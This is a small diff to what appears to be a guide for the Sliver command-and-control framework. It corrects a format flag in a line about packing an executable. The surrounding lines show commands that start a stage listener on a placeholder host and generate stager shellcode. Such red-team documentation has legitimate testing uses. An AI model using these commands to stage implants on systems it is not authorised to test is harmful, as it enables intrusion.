@@ -53,7 +53,7 @@ sliver > stage-listener --url http://<IP>:8080 --profile my-profile
 sliver > generate --format shellcode --stage-listener http://<IP>:8080 --save /tmp/stager.bin
 ```
 
-You can also pack a standalone `.exe` (`--format raw`) or a .NET assembly.
+You can also pack a standalone `.exe` (`--format exe`) or a .NET assembly.
 
 ---
 
